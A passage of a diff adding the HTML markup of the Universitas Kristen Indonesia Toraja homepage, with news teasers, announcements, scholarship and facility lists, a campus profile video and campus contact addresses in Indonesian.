+Toraja Utara.</span></p></div>
+			</div><div class="et_pb_button_module_wrapper et_pb_button_4_wrapper 
+et_pb_button_alignment_left et_pb_module ">
+				<a class="et_pb_button et_pb_button_4 hover-button et_pb_bg_layout_dark" 
+href="https://ukitoraja.ac.id/webx/fakultas-teologi/" target="_blank" data-icon="&#x24;">Selengkapnya</a>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div>
+				
+				
+			</div><div class="et_pb_section et_pb_section_4 et_pb_with_background 
+et_section_regular" >
+				
+				
+				
+				
+				
+				
+				<div class="et_pb_row et_pb_row_1">
+				<div class="et_pb_column et_pb_column_3_4 et_pb_column_7  
+et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_with_border et_pb_module et_pb_text et_pb_text_10  
+et_pb_text_align_left et_pb_text_align_center-phone et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><h1 style="text-align: left;">BERITA 
+TERKINI</h1></div>
+			</div><div class="et_pb_module et_pb_blog_0 et_pb_blog_grid_wrapper 
+et_pb_bg_layout_light">
+					<div class="et_pb_blog_grid clearfix ">
+					
+					
+					
+					
+					<div class="et_pb_ajax_pagination_container">
+						<div class="et_pb_salvattore_content" data-columns>
+			<article id="post-9679" class="et_pb_post clearfix et_pb_blog_item_0_0 post-9679 post 
+type-post status-publish format-standard has-post-thumbnail hentry category-berita">
+
+				<div class="et_pb_image_container"><a 
+href="https://ukitoraja.ac.id/webx/uki-toraja-peringkat-pertama-the-best-questionnaire-and-education-pada-sulawesi-education-and-techni-expo-2024/" 
+class="entry-featured-image-url"><img loading="lazy" decoding="async" 
+src="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2024/02/Cover-Web-UKI-Berita.jpg?resize=400%2C250&#038;ssl=1" 
+alt="UKI Toraja Peringkat Pertama The Best Questionnaire and Education pada Sulawesi Education and Techni Expo 
+2024" class="" 
+srcset="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2024/02/Cover-Web-UKI-Berita.jpg?fit=1080%2C681&ssl=1 
+479w, 
+https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2024/02/Cover-Web-UKI-Berita.jpg?resize=400%2C250&ssl=1 
+480w " sizes="(max-width:479px) 479px, 100vw "  width="400" height="250" /></a></div>
+														
+<h2 class="entry-title"><a 
+href="https://ukitoraja.ac.id/webx/uki-toraja-peringkat-pertama-the-best-questionnaire-and-education-pada-sulawesi-education-and-techni-expo-2024/">UKI 
+Toraja Peringkat Pertama The Best Questionnaire and Education pada Sulawesi Education and Techni Expo 
+2024</a></h2>
+				
+					<p class="post-meta"><span class="published">Jan 27, 2024</span> | <a 
+href="https://ukitoraja.ac.id/webx/category/berita/" rel="tag">Berita</a></p><div class="post-content"><div 
+class="post-content-inner"><p>&nbsp; Universitas Kristen Indonesia Toraja kembali membawa pulang piala pada 
+ajang pameran Pendidikan dan teknologi “Sulawesi Education and Techno Expo 2024” yang digelar di Sandeq Ballroom 
+Claro Hotel Makassar selama tiga...</p>
+</div><a 
+href="https://ukitoraja.ac.id/webx/uki-toraja-peringkat-pertama-the-best-questionnaire-and-education-pada-sulawesi-education-and-techni-expo-2024/" 
+class="more-link">read more</a></div>			
+			</article>
+				
+			<article id="post-9485" class="et_pb_post clearfix et_pb_blog_item_0_1 post-9485 post 
+type-post status-publish format-standard has-post-thumbnail hentry category-berita category-bipa-uki-toraja 
+tag-bipa-uki-toraja-2 tag-kerjasama-uki-toraja tag-toraja tag-uki-toraja">
+
+				<div class="et_pb_image_container"><a 
+href="https://ukitoraja.ac.id/webx/mahasiswainternasional/" class="entry-featured-image-url"><img loading="lazy" 
+decoding="async" 
+src="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/12/7-Mahasiswa-Internasional-Kuliah-di-UKI-Toraja.jpg?resize=400%2C250&#038;ssl=1" 
+alt="7 Mahasiswa Internasional Kuliah di UKI Toraja" class="" 
+srcset="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/12/7-Mahasiswa-Internasional-Kuliah-di-UKI-Toraja.jpg?fit=1080%2C681&ssl=1 
+479w, 
+https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/12/7-Mahasiswa-Internasional-Kuliah-di-UKI-Toraja.jpg?resize=400%2C250&ssl=1 
+480w " sizes="(max-width:479px) 479px, 100vw "  width="400" height="250" /></a></div>
+														
+<h2 class="entry-title"><a href="https://ukitoraja.ac.id/webx/mahasiswainternasional/">7 Mahasiswa Internasional 
+Kuliah di UKI Toraja</a></h2>
+				
+					<p class="post-meta"><span class="published">Dec 19, 2023</span> | <a 
+href="https://ukitoraja.ac.id/webx/category/berita/" rel="tag">Berita</a>, <a 
+href="https://ukitoraja.ac.id/webx/category/bipa-uki-toraja/" rel="tag">BIPA UKI Toraja</a></p><div 
+class="post-content"><div class="post-content-inner"><p>UKI Toraja memperkenalkan keberagaman budaya dan Bahasa 
+Indonesia dengan hadirnya tujuh mahasiswa internasional melalui Program Bahasa Indonesia Penutur Asing (BIPA). 
+Ketujuh mahasiswa tersebut adalah Adebayo (Nigeria), Olorun...</p>
+</div><a href="https://ukitoraja.ac.id/webx/mahasiswainternasional/" class="more-link">read more</a></div>			
+			</article>
+				
+			<article id="post-9475" class="et_pb_post clearfix et_pb_blog_item_0_2 post-9475 post 
+type-post status-publish format-standard has-post-thumbnail hentry category-berita category-uncategorized 
+tag-natal-2023 tag-natal-uki-toraja tag-uki-toraja">
+
+				<div class="et_pb_image_container"><a 
+href="https://ukitoraja.ac.id/webx/natal23/" class="entry-featured-image-url"><img loading="lazy" 
+decoding="async" 
+src="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/12/Ibadah-Natal-2023-1.jpg?resize=400%2C250&#038;ssl=1" 
+alt="Perayaan Natal Tahun 2023 YPTKM dan UKI Toraja" class="" 
+srcset="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/12/Ibadah-Natal-2023-1.jpg?fit=1080%2C681&ssl=1 
+479w, 
+https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/12/Ibadah-Natal-2023-1.jpg?resize=400%2C250&ssl=1 
+480w " sizes="(max-width:479px) 479px, 100vw "  width="400" height="250" /></a></div>
+														
+<h2 class="entry-title"><a href="https://ukitoraja.ac.id/webx/natal23/">Perayaan Natal Tahun 2023 YPTKM dan UKI 
+Toraja</a></h2>
+				
+					<p class="post-meta"><span class="published">Dec 18, 2023</span> | <a 
+href="https://ukitoraja.ac.id/webx/category/berita/" rel="tag">Berita</a>, <a 
+href="https://ukitoraja.ac.id/webx/category/uncategorized/" rel="tag">Uncategorized</a></p><div 
+class="post-content"><div class="post-content-inner"><p>Yayasan Perguruan Tinggi Kristen Makale (YPTKM) dan UKI 
+Toraja merayakan Natal di aula kampus 1 UKI Toraja pada hari Sabtu, 16 Desember 2023. Dengan tema "Kemuliaan 
+Bagi Allah dan Damai Sejahtera di Bumi" (Lukas 2:14), perayaan...</p>
+</div><a href="https://ukitoraja.ac.id/webx/natal23/" class="more-link">read more</a></div>			
+			</article>
+				
+			<article id="post-9323" class="et_pb_post clearfix et_pb_blog_item_0_3 post-9323 post 
+type-post status-publish format-standard has-post-thumbnail hentry category-berita tag-guru-besar 
+tag-guru-besar-uki-toraja tag-toraja tag-uki-toraja">
+
+				<div class="et_pb_image_container"><a 
+href="https://ukitoraja.ac.id/webx/pengukuhanprofnov23/" class="entry-featured-image-url"><img loading="lazy" 
+decoding="async" 
+src="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/11/L-Pengukuhan-guru-besar-cover.jpg?resize=400%2C250&#038;ssl=1" 
+alt="Pengukuhan 3 Guru Besar Sebagai Tonggak Prestasi UKI Toraja" class="" 
+srcset="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/11/L-Pengukuhan-guru-besar-cover.jpg?fit=1080%2C681&ssl=1 
+479w, 
+https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/11/L-Pengukuhan-guru-besar-cover.jpg?resize=400%2C250&ssl=1 
+480w " sizes="(max-width:479px) 479px, 100vw "  width="400" height="250" /></a></div>
+														
+<h2 class="entry-title"><a href="https://ukitoraja.ac.id/webx/pengukuhanprofnov23/">Pengukuhan 3 Guru Besar 
+Sebagai Tonggak Prestasi UKI Toraja</a></h2>
+				
+					<p class="post-meta"><span class="published">Nov 18, 2023</span> | <a 
+href="https://ukitoraja.ac.id/webx/category/berita/" rel="tag">Berita</a></p><div class="post-content"><div 
+class="post-content-inner"><p>UKI Toraja mencatat sejarah gemilang dengan mengukuhkan tiga guru besar pada 
+tanggal 17 November 2023. Acara tersebut menjadi tonggak bersejarah bagi UKI Toraja, karena untuk pertama 
+kalinya UKI Toraja memiliki guru besar sejak...</p>
+</div><a href="https://ukitoraja.ac.id/webx/pengukuhanprofnov23/" class="more-link">read more</a></div>			
+			</article>
+				</div><div><div class="pagination clearfix">
+	<div class="alignleft"><a href="https://ukitoraja.ac.id/webx/page/2/?et_blog" >&laquo; Older 
+Entries</a></div>
+	<div class="alignright"></div>
+</div></div></div>
+					</div>
+					 
+				</div>
+			</div><div class="et_pb_column et_pb_column_1_4 et_pb_column_8  
+et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_with_border et_pb_module et_pb_text et_pb_text_11  
+et_pb_text_align_left et_pb_text_align_center-phone et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><h1 style="text-align: 
+left;">PENGUMUMAN</h1></div>
+			</div><div class="et_pb_module et_pb_blog_1 et_pb_blog_grid_wrapper 
+et_pb_bg_layout_light">
+					<div class="et_pb_blog_grid clearfix ">
+					
+					
+					
+					
+					<div class="et_pb_ajax_pagination_container">
+						<div class="et_pb_salvattore_content" data-columns>
+			<article id="post-9317" class="et_pb_post clearfix et_pb_blog_item_1_0 post-9317 post 
+type-post status-publish format-standard has-post-thumbnail hentry category-pengumuman tag-pembayaran 
+tag-pembayaran-uang-kuliah-uki-toraja tag-uang-kuliah tag-uki-toraja">
+
+				<div class="et_pb_image_container"><a 
+href="https://ukitoraja.ac.id/webx/pelunasan-uang-kuliah-semester-ganjil-t-a-2023-2024/" 
+class="entry-featured-image-url"><img loading="lazy" decoding="async" 
+src="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/11/Cover-Pengumuman-Web.jpg?resize=400%2C250&#038;ssl=1" 
+alt="Pelunasan Uang Kuliah Semester Ganjil T.A. 2023/2024" class="" 
+srcset="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/11/Cover-Pengumuman-Web.jpg?fit=1080%2C681&ssl=1 
+479w, 
+https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/11/Cover-Pengumuman-Web.jpg?resize=400%2C250&ssl=1 
+480w " sizes="(max-width:479px) 479px, 100vw "  width="400" height="250" /></a></div>
+														
+<h2 class="entry-title"><a 
+href="https://ukitoraja.ac.id/webx/pelunasan-uang-kuliah-semester-ganjil-t-a-2023-2024/">Pelunasan Uang Kuliah 
+Semester Ganjil T.A. 2023/2024</a></h2>
+				
+					<p class="post-meta"><span class="published">Nov 18, 2023</span> | <a 
+href="https://ukitoraja.ac.id/webx/category/pengumuman/" rel="tag">Pengumuman</a></p><div 
+class="post-content"><div class="post-content-inner"></div><a 
+href="https://ukitoraja.ac.id/webx/pelunasan-uang-kuliah-semester-ganjil-t-a-2023-2024/" class="more-link">read 
+more</a></div>			
+			</article>
+				
+			<article id="post-9209" class="et_pb_post clearfix et_pb_blog_item_1_1 post-9209 post 
+type-post status-publish format-standard has-post-thumbnail hentry category-pengumuman tag-makale tag-rantepao 
+tag-toraja tag-uki-toraja">
+
+				<div class="et_pb_image_container"><a 
+href="https://ukitoraja.ac.id/webx/rplukit2023/" class="entry-featured-image-url"><img loading="lazy" 
+decoding="async" 
+src="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/10/RPL-2023.jpg?resize=400%2C250&#038;ssl=1" 
+alt="PENGUMUMAN HASIL SELEKSI CALON MAHASISWA REKOGNISI PEMBELAJARAN LAMPAU SEMESTER GANJIL T.A. 2023/2024" 
+class="" 
+srcset="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/10/RPL-2023.jpg?fit=1080%2C681&ssl=1 
+479w, https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/10/RPL-2023.jpg?resize=400%2C250&ssl=1 480w 
+" sizes="(max-width:479px) 479px, 100vw "  width="400" height="250" /></a></div>
+														
+<h2 class="entry-title"><a href="https://ukitoraja.ac.id/webx/rplukit2023/">PENGUMUMAN HASIL SELEKSI CALON 
+MAHASISWA REKOGNISI PEMBELAJARAN LAMPAU SEMESTER GANJIL T.A. 2023/2024</a></h2>
+				
+					<p class="post-meta"><span class="published">Oct 7, 2023</span> | <a 
+href="https://ukitoraja.ac.id/webx/category/pengumuman/" rel="tag">Pengumuman</a></p><div 
+class="post-content"><div class="post-content-inner"><p>Download Pengumuman Hasil...</p>
+</div><a href="https://ukitoraja.ac.id/webx/rplukit2023/" class="more-link">read more</a></div>			
+			</article>
+				
+			<article id="post-9015" class="et_pb_post clearfix et_pb_blog_item_1_2 post-9015 post 
+type-post status-publish format-standard has-post-thumbnail hentry category-pengumuman">
+
+				<div class="et_pb_image_container"><a 
+href="https://ukitoraja.ac.id/webx/pemilihan-dekan-fakultas-ekonomi/" class="entry-featured-image-url"><img 
+loading="lazy" decoding="async" 
+src="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/09/Dekan-Ekonomi.jpg?resize=400%2C250&#038;ssl=1" 
+alt="Pemilihan Dekan Fakultas Ekonomi" class="" 
+srcset="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/09/Dekan-Ekonomi.jpg?fit=1080%2C681&ssl=1 
+479w, https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2023/09/Dekan-Ekonomi.jpg?resize=400%2C250&ssl=1 
+480w " sizes="(max-width:479px) 479px, 100vw "  width="400" height="250" /></a></div>
+														
+<h2 class="entry-title"><a href="https://ukitoraja.ac.id/webx/pemilihan-dekan-fakultas-ekonomi/">Pemilihan Dekan 
+Fakultas Ekonomi</a></h2>
+				
+					<p class="post-meta"><span class="published">Sep 4, 2023</span> | <a 
+href="https://ukitoraja.ac.id/webx/category/pengumuman/" rel="tag">Pengumuman</a></p><div 
+class="post-content"><div class="post-content-inner"></div><a 
+href="https://ukitoraja.ac.id/webx/pemilihan-dekan-fakultas-ekonomi/" class="more-link">read more</a></div>			
+			</article>
+				</div><div><div class="pagination clearfix">
+	<div class="alignleft"><a href="https://ukitoraja.ac.id/webx/page/2/?et_blog" >&laquo; Older 
+Entries</a></div>
+	<div class="alignright"></div>
+</div></div></div>
+					</div>
+					 
+				</div>
+			</div>
+				
+				
+				
+				
+			</div>
+				
+				
+			</div><div class="et_pb_section et_pb_section_5 et_section_regular" >
+				
+				
+				
+				
+				
+				
+				<div class="et_pb_row et_pb_row_2 et_pb_equal_columns et_pb_gutters1">
+				<div class="et_pb_column et_pb_column_3_5 et_pb_column_9 et_pb_section_parallax  
+et_pb_css_mix_blend_mode_passthrough et_pb_column_empty">
+				<span class="et_parallax_bg_wrap"><span
+						class="et_parallax_bg et_parallax_bg_phone"
+						style="background-image: 
+url(https://ukitoraja.ac.id/webx/wp-content/uploads/2024/02/EXPO241-2.jpg);"
+					></span></span><span class="et_parallax_bg_wrap"><span
+						class="et_parallax_bg_phone_exist et_parallax_bg 
+et_parallax_bg_tablet"
+						style="background-image: 
+url(https://ukitoraja.ac.id/webx/wp-content/uploads/2024/02/EXPO241-2.jpg);"
+					></span></span><span class="et_parallax_bg_wrap"><span
+						class="et_parallax_bg_phone_exist et_parallax_bg_tablet_exist 
+et_parallax_bg"
+						style="background-image: 
+url(https://ukitoraja.ac.id/webx/wp-content/uploads/2024/02/EXPO241-2.jpg);"
+					></span></span>
+				
+				
+				
+				
+			</div><div class="et_pb_column et_pb_column_1_5 et_pb_column_10 
+et_pb_section_video_on_hover et_pb_section_parallax_hover  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_cta_0 et_pb_section_video_on_hover et_pb_promo  
+et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_promo_description"><h2 class="et_pb_module_header">INFORMASI 
+BEA SISWA</h2><div><p>Bantuan Prestasi Akademik<br />Bantuan Prestasi Non Akademik<br />Bantuan Pendidikan ketua 
+PPGT &amp; SMGT<br />Bantuan pendidikan Siangkaran</p></div></div>
+				
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_5 et_pb_column_11 
+et_pb_section_video_on_hover et_pb_section_parallax_hover  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_cta_1 et_pb_promo  et_pb_text_align_left 
+et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_promo_description"><h3 class="et_pb_module_header">FASILITAS 
+KAMPUS</h3><div><p>Campus Ministry<br />Rusunawa<br />Perpustakaan<br />Laboratorium<br />Sarana Olahraga<br 
+/>Green House<br />Bus Kampus<u></u></p></div></div>
+				
+			</div>
+			</div>
+				
+				
+				
+				
+			</div><div class="et_pb_row et_pb_row_3 et_pb_equal_columns et_pb_gutters1">
+				<div class="et_pb_column et_pb_column_1_3 et_pb_column_12 
+et_pb_section_video_on_hover et_pb_section_parallax_hover  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_with_border et_pb_module et_pb_blurb et_pb_blurb_0  
+et_pb_text_align_center  et_pb_blurb_position_top et_pb_bg_layout_dark">
+				
+				
+				
+				
+				<div class="et_pb_blurb_content">
+					
+					<div class="et_pb_blurb_container">
+						<h1 class="et_pb_module_header"><a 
+href="https://ukitoraja.ac.id/webx/unit-kegiatan-kampus-ukm/" target="_blank">UNIT KEGIATAN MAHASISWA 
+(UKM)</a></h1>
+						
+					</div>
+				</div>
+			</div><div class="et_pb_with_border et_pb_module et_pb_blurb et_pb_blurb_1  
+et_pb_text_align_center  et_pb_blurb_position_top et_pb_bg_layout_dark">
+				
+				
+				
+				
+				<div class="et_pb_blurb_content">
+					
+					<div class="et_pb_blurb_container">
+						<h1 class="et_pb_module_header"><a 
+href="https://ukitoraja.ac.id/webx/unit-kegiatan-kampus-ukm/" target="_blank">UNIT KEGIATAN MAHASISWA 
+(UKM)</a></h1>
+						
+					</div>
+				</div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_3 et_pb_column_13 
+et_pb_section_video_on_hover et_pb_section_parallax_hover  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_with_border et_pb_module et_pb_blurb et_pb_blurb_2  
+et_pb_text_align_center  et_pb_blurb_position_top et_pb_bg_layout_dark">
+				
+				
+				
+				
+				<div class="et_pb_blurb_content">
+					
+					<div class="et_pb_blurb_container">
+						<h1 class="et_pb_module_header"><a 
+href="https://ukitoraja.ac.id/webx/prestasi-mahasiswa/" target="_blank">PRESTASI MAHASISWA</a></h1>
+						
+					</div>
+				</div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_3 et_pb_column_14 
+et_pb_section_video_on_hover et_pb_section_parallax_hover  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_with_border et_pb_module et_pb_blurb et_pb_blurb_3 
+et_clickable  et_pb_text_align_center  et_pb_blurb_position_top et_pb_bg_layout_dark">
+				
+				
+				
+				
+				<div class="et_pb_blurb_content">
+					
+					<div class="et_pb_blurb_container">
+						<h1 class="et_pb_module_header"><span>KEHIDUPAN 
+KAMPUS</span></h1>
+						
+					</div>
+				</div>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div><div class="et_pb_row et_pb_row_4 et_pb_equal_columns et_pb_gutters2">
+				<div class="et_pb_column et_pb_column_1_3 et_pb_column_15  
+et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_image et_pb_image_0 et_pb_image_sticky">
+				
+				
+				
+				
+				<span class="et_pb_image_wrap "><img loading="lazy" decoding="async" width="900" 
+height="477" 
+src="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2024/02/EXPO241-2.jpg?resize=900%2C477&#038;ssl=1" 
+alt="" title="EXPO241" 
+srcset="https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2024/02/EXPO241-2.jpg?w=900&ssl=1 900w, 
+https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2024/02/EXPO241-2.jpg?resize=300%2C159&ssl=1 300w, 
+https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2024/02/EXPO241-2.jpg?resize=768%2C407&ssl=1 768w, 
+https://i0.wp.com/ukitoraja.ac.id/webx/wp-content/uploads/2024/02/EXPO241-2.jpg?resize=480%2C254&ssl=1 480w" 
+sizes="(max-width: 900px) 100vw, 900px" class="wp-image-9658" data-recalc-dims="1" /></span>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_3 et_pb_column_16 
+et_pb_section_video_on_hover et_pb_section_parallax_hover  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_blurb et_pb_blurb_4  et_pb_text_align_left  
+et_pb_blurb_position_top et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_blurb_content">
+					
+					<div class="et_pb_blurb_container">
+						<h4 class="et_pb_module_header"><span>INFORMASI BEA 
+SISWA</span></h4>
+						<div class="et_pb_blurb_description"><p><span>Bantuan Prestasi 
+Akademik</span><br /><span>Bantuan Prestasi Non Akademik</span><br /><span>Bantuan Pendidikan ketua PPGT &amp; 
+SMGT</span><br /><span>Bantuan pendidikan Siangkaran</span></p></div>
+					</div>
+				</div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_3 et_pb_column_17 
+et_pb_section_video_on_hover et_pb_section_parallax_hover  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_blurb et_pb_blurb_5  et_pb_text_align_left  
+et_pb_blurb_position_top et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_blurb_content">
+					
+					<div class="et_pb_blurb_container">
+						<h4 class="et_pb_module_header"><span>FASILITAS 
+KAMPUS</span></h4>
+						<div class="et_pb_blurb_description"><p>Campus Ministry<br 
+/>Rusunawa<br />Perpustakaan<br />Laboratorium<br />Sarana Olahraga<br />Green House<br />Bus Campus</p></div>
+					</div>
+				</div>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div><div class="et_pb_row et_pb_row_5">
+				<div class="et_pb_column et_pb_column_1_3 et_pb_column_18  
+et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_blurb et_pb_blurb_6 et_clickable  
+et_pb_text_align_center  et_pb_blurb_position_top et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_blurb_content">
+					
+					<div class="et_pb_blurb_container">
+						
+						<div class="et_pb_blurb_description"><p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><span style="color: #ffffff;">UNIT KEGIATAN MAHASISWA (UKM)</span></p></div>
+					</div>
+				</div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_3 et_pb_column_19  
+et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_blurb et_pb_blurb_7 et_clickable  
+et_pb_text_align_center  et_pb_blurb_position_top et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_blurb_content">
+					
+					<div class="et_pb_blurb_container">
+						
+						<div class="et_pb_blurb_description"><p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><span style="color: #ffffff;">PRESTASI MAHASISWA</span></p></div>
+					</div>
+				</div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_3 et_pb_column_20  
+et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_blurb et_pb_blurb_8 et_clickable  
+et_pb_text_align_center  et_pb_blurb_position_top et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_blurb_content">
+					
+					<div class="et_pb_blurb_container">
+						
+						<div class="et_pb_blurb_description"><p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><span style="color: #ffffff;">KEHIDUPAN KAMPUS</span></p></div>
+					</div>
+				</div>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div>
+				
+				
+			</div><div class="et_pb_section et_pb_section_6 et_section_regular" >
+				
+				
+				
+				
+				
+				
+				<div class="et_pb_row et_pb_row_6">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_21  
+et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_with_border et_pb_module et_pb_text et_pb_text_12  
+et_pb_text_align_left et_pb_text_align_center-phone et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><h1 style="text-align: center;">PROFIL 
+KAMPUS</h1></div>
+			</div><div class="et_pb_module et_pb_video et_pb_video_0">
+				
+				
+				
+				
+				<div class="et_pb_video_box"><iframe loading="lazy" title="Profil Universitas 
+Kristen Toraja 2023" width="1080" height="608" src="https://www.youtube.com/embed/jrm4nQCWNxY?feature=oembed"  
+allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe></div>
+				
+			</div>
+			</div>
+				
+				
+				
+				
+			</div>
+				
+				
+			</div><div class="et_pb_section et_pb_section_7 et_pb_with_background 
+et_section_regular" >
+				
+				
+				
+				
+				
+				
+				<div class="et_pb_row et_pb_row_7">
+				<div class="et_pb_column et_pb_column_1_3 et_pb_column_22  
+et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_13  et_pb_text_align_left 
+et_pb_text_align_center-phone et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p><b>Kantor Pusat</b><br /><span>Jalan Nusantara 
+No 12</span><br /><span>Telp : (0423)22468 / (0423) 22887</span><br /><span>Fax : (0423)22073</span><br 
+/><span>Kode Pos: 91811 Makale, Tana Toraja Sulawesi Selatan, Indonesia</span></p></div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_3 et_pb_column_23  
+et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_14  et_pb_text_align_left 
+et_pb_text_align_center-phone et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p><b>Kampus 1</b><br /> Jalan Jenderal Sudirman 
+No.9 Makale<br /> Telp:(0423) 22060<br /> Kode Pos: 91811</p>
+<p><b>Kampus 2</b><br /> Jalan Poros Rantepao Sa’dan<br /> Kabupaten Toraja Utara</p>
+<p>&nbsp;</p></div>
+			</div>
+			</div><div class="et_pb_column et_pb_column_1_3 et_pb_column_24  
+et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_15  et_pb_text_align_left 
+et_pb_text_align_center-phone et_pb_bg_layout_light">
+				
+				
+				
+				
+				<div class="et_pb_text_inner"><p><b>Kampus 3</b><br /> Jalan Dr.Ratulangi No.80 
+Rantepao<br /> Telp:(0423) 21129<br /> Kabupaten Toraja Utara</p></div>
+			</div>
+			</div>
+				
+				
+				
+				
+			</div><div class="et_pb_row et_pb_row_8">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_25  
+et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				
+				
+				<ul class="et_pb_module et_pb_social_media_follow et_pb_social_media_follow_0 
+clearfix  et_pb_text_align_center et_pb_bg_layout_light">
+				
+				
+				
+				
+				<li
+            class='et_pb_social_media_follow_network_0 et_pb_social_icon et_pb_social_network_link  
+et-social-facebook'><a
+              href='https://www.facebook.com/humasukit/'
+              class='icon et_pb_with_border'
+              title='Follow on Facebook'
+               target="_blank"><span
+                class='et_pb_social_media_follow_network_name'
+                aria-hidden='true'
+                >Follow</span></a></li><li
+            class='et_pb_social_media_follow_network_1 et_pb_social_icon et_pb_social_network_link  
+et-social-instagram'><a
+              href='https://www.instagram.com/uki.toraja/'
+              class='icon et_pb_with_border'
+              title='Follow on Instagram'
+               target="_blank"><span
+                class='et_pb_social_media_follow_network_name'
+                aria-hidden='true'
+                >Follow</span></a></li><li
+            class='et_pb_social_media_follow_network_2 et_pb_social_icon et_pb_social_network_link  
+et-social-youtube'><a
+              href='https://www.youtube.com/c/UKITorajaOfficial'
+              class='icon et_pb_with_border'
+              title='Follow on Youtube'
+               target="_blank"><span
+                class='et_pb_social_media_follow_network_name'
+                aria-hidden='true'
+                >Follow</span></a></li><li
+            class='et_pb_social_media_follow_network_3 et_pb_social_icon et_pb_social_network_link  
+et-social-linkedin'><a
+              href='https://www.linkedin.com/school/universitas-kristen-indonesia-toraja/'
+              class='icon et_pb_with_border'
+              title='Follow on LinkedIn'
